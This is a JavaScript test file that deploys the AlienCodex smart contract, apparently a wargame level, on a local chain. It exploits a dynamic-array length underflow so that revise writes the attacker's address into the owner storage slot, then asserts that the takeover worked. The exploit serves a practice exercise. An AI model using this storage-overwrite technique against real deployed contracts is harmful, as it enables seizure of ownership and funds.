import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { ethers } from "ethers";
import { readFile } from "node:fs/promises";

const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

const artifact = JSON.parse(
  await readFile(
    "artifacts/contracts/AlienCodex.sol/AlienCodex.json",
    "utf8"
  )
);

let signer;
let alienCodex;

beforeEach(async () => {
  signer = await provider.getSigner(1);

  const factory = new ethers.ContractFactory(
    artifact.abi,
    artifact.bytecode,
    signer
  );

  alienCodex = await factory.deploy();
  await alienCodex.waitForDeployment();
});

test("overwrites the owner through dynamic-array storage underflow", async () => {
  const attackerAddress = await signer.getAddress();

  await (await alienCodex.makeContact()).wait();
  await (await alienCodex.retract()).wait();

  const arraySlot = BigInt(
    ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(
        ["uint256"],
        [1]
      )
    )
  );

  const index = (1n << 256n) - arraySlot;

  const attackerWord = ethers.zeroPadValue(attackerAddress, 32);

  await (await alienCodex.revise(index, attackerWord)).wait();

  assert.equal(
    (await alienCodex.owner()).toLowerCase(),
    attackerAddress.toLowerCase()
  );
});

